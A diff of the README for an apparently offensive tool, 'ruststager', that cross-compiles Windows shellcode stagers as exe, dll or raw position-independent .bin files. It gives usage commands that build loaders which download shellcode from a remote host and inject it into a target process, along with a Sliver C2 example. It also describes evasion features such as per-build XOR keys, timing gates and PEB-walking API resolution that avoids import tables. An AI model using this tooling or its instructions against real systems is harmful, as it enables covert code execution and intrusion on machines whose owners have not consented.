@@ -6,8 +6,9 @@
 > Use only on systems you own or have explicit written permission to test.
 > The author is not responsible for any illegal or unauthorized use.
 
-A generator that cross-compiles a tiny Windows shellcode stager (`.exe` or `.dll`) from
-**Windows or Linux**. Only `rustup` is needed: no MSVC, no mingw, no Windows SDK.
+A generator that cross-compiles a tiny Windows shellcode stager (`.exe`, `.dll`, or raw
+position-independent shellcode `.bin`) from **Windows or Linux**. Only `rustup` is needed:
+no MSVC, no mingw, no Windows SDK.
 
 The stager fetches shellcode from one of three sources and injects it into a target process:
 
@@ -50,6 +51,9 @@ ruststager --url https://10.10.10.1/sc.bin -f dll -o stager.dll
 
 # Read shellcode from a local path at runtime
 ruststager --local 'C:\Windows\Temp\sc.bin'
+
+# Generate raw PIC shellcode (.bin)
+ruststager --url https://10.10.10.1/stage.bin -f shellcode -o loader.bin
 ```
 
 ## Usage
@@ -58,21 +62,21 @@ ruststager --local 'C:\Windows\Temp\sc.bin'
 ruststager [OPTIONS] <--url <URL>|--local <PATH>|--embed <FILE>> [--pid <PROCESS>]
 ```
 
-| Option                  | Default        | Meaning                                                               |
-| ----------------------- | -------------- | --------------------------------------------------------------------- |
-| `--url <URL>`           |                | download shellcode at runtime (http/https)                            |
-| `--local <PATH>`        |                | read shellcode from this path on the Windows machine                  |
-| `--embed <FILE>`        |                | bake shellcode into the binary at generation time                     |
-| `-f, --format exe\|dll` | `exe`          | output format                                                         |
-| `-a, --arch ARCH`       | `x86_64`       | `x86_64` (`x64`), `x86` (`i686`), `aarch64` (`arm64`)                 |
-| `--pid <PROCESS>`       |                | inject into this process name instead of the default chain            |
-| `-o, --output FILE`     | `stager.<ext>` | output file                                                           |
-| `--keep DIR`            |                | keep the generated cargo project in `DIR`                             |
-| `--template DIR`        | built-in       | use an edited template (see below)                                    |
-| `--dep SPEC`            |                | extra `no_std`-compatible dependency, e.g. `--dep 'heapless = "0.8"'` |
-| `--no-install`          |                | don't run `rustup target add`; fail if target is missing              |
-| `-v, --verbose`         |                | show cargo's output                                                   |
-| `--export-template DIR` |                | write the built-in template to `DIR` and exit                         |
+| Option                             | Default        | Meaning                                                                              |
+| ---------------------------------- | -------------- | ------------------------------------------------------------------------------------ |
+| `--url <URL>`                      |                | download shellcode at runtime (http/https)                                           |
+| `--local <PATH>`                   |                | read shellcode from this path on the Windows machine                                 |
+| `--embed <FILE>`                   |                | bake shellcode into the binary at generation time                                    |
+| `-f, --format exe\|dll\|shellcode` | `exe`          | output format (`shellcode` -> x86-64 only, produces `.bin`)                          |
+| `-a, --arch ARCH`                  | `x86_64`       | `x86_64` (`x64`), `x86` (`i686`), `aarch64` (`arm64`), `shellcode` requires `x86_64` |
+| `--pid <PROCESS>`                  |                | inject into this process name instead of the default chain                           |
+| `-o, --output FILE`                | `stager.<ext>` | output file                                                                          |
+| `--keep DIR`                       |                | keep the generated cargo project in `DIR`                                            |
+| `--template DIR`                   | built-in       | use an edited template (see below)                                                   |
+| `--dep SPEC`                       |                | extra `no_std`-compatible dependency, e.g. `--dep 'heapless = "0.8"'`                |
+| `--no-install`                     |                | don't run `rustup target add`; fail if target is missing                             |
+| `-v, --verbose`                    |                | show cargo's output                                                                  |
+| `--export-template DIR`            |                | write the built-in template to `DIR` and exit                                        |
 
 The first build for an architecture runs `rustup target add <triple>` (a ~20 MB download, once).
 Dependencies compile once per target in a shared cache:
@@ -91,6 +95,26 @@ rundll32 stager.dll,Run
   `Run` waits for it; `rundll32 stager.dll,Run` works. A host that exits right after
   `LoadLibrary` returns may not finish the injection.
 
+## Shellcode Format (`-f shellcode`)
+
+`-f shellcode` produces a raw **position-independent** `.bin` file: no PE headers, no IAT,
+no loader required.
+
+**How it works:**
+
+1. The generator compiles `shellcode.rs` (instead of `stager.rs`) as a Windows PE `.exe`.
+2. It then parses the PE and extracts the `.text` section (all read-only data is merged
+   into it via `/MERGE:.rdata=.text`).
+3. If the entry function is not at offset 0, a 5-byte `JMP` stub is prepended so the
+   output is always callable from byte 0.
+4. The resulting `.bin` is entirely self-contained: APIs are resolved at runtime by
+   walking the PEB -> kernel32 export table, with no IAT entries.
+
+**Constraints:**
+
+- **x86-64 only** (PEB walk uses `gs:[0x60]`; pass `-a x86_64` or omit `-a`).
+- Same OPSEC features as exe/dll: per-build XOR key, timing gate, encrypted target.
+
 ## Sliver Example
 
 ```
@@ -108,8 +132,13 @@ ruststager --url http://10.10.10.1/index.html?v=ID -o stager.exe
 
 ## Editing the Generated Program
 
-The stager template lives in [`template/`](template/), a normal cargo project. Its source is
-[`template/src/stager.rs`](template/src/stager.rs). Build it directly for quick iteration:
+The stager template lives in [`template/`](template/), a normal cargo project. There are two
+source files:
+
+- [`template/src/stager.rs`](template/src/stager.rs): exe/dll format; uses `windows-sys`
+- [`template/src/shellcode.rs`](template/src/shellcode.rs): shellcode format; pure PIC, no IAT
+
+Build the exe/dll template directly for quick iteration:
 
 ```bash
 cd template
@@ -117,6 +146,9 @@ cargo build --release                                           # url mode (defa
 cargo build --release --no-default-features --features local    # local mode
 cargo build --release --no-default-features --features embed    # embed mode
 ```
+
+The shellcode source (`shellcode.rs`) is compiled by the generator only; it is not the
+default target in `template/Cargo.toml` (which points to `stager.rs`).
 
 The path/URL comes from the compile-time env var `RG_TARGET` in `template/.cargo/config.toml`.
 The embedded shellcode is `template/payload.bin`. The generator copies the template verbatim
@@ -139,9 +171,19 @@ Three ways to customise the stager:
 - No `std`, no allocator. Use `VirtualAlloc` / slice slabs for large buffers.
 - **Stack frames < 4 KB** (no `__chkstk`); declare large buffers as `static mut`.
 - No 64-bit division on x86 (`_aulldiv` comes from the CRT).
-- Panics call `ExitProcess(101)`.
-- To call another Windows API, add its windows-sys feature in `template/Cargo.toml`.
+- Panics call `ExitProcess(101)` (exe/dll) or execute `ud2` (shellcode).
+- To call another Windows API in `stager.rs`, add its `windows-sys` feature in `template/Cargo.toml`.
 - Added crates must be `no_std` compatible.
+
+**Additional rules for `shellcode.rs`:**
+
+- **No `windows-sys`**: that crate generates IAT entries; `shellcode.rs` resolves every API
+  at runtime via PEB walking and GetProcAddress.
+- **No new IAT-importing crates**: any dependency that calls a Windows API through the IAT
+  will produce a shellcode that crashes at relocation.
+- Provide bare-metal `memcmp`/`memcpy`/`memset`/`memmove` (already in `shellcode.rs`) if you
+  use slice operations that the compiler lowers to these intrinsics.
+- The entry function signature must be `pub extern "system" fn entry(_: *mut c_void) -> u32`.
 
 ## How Cross-Compilation Works
 
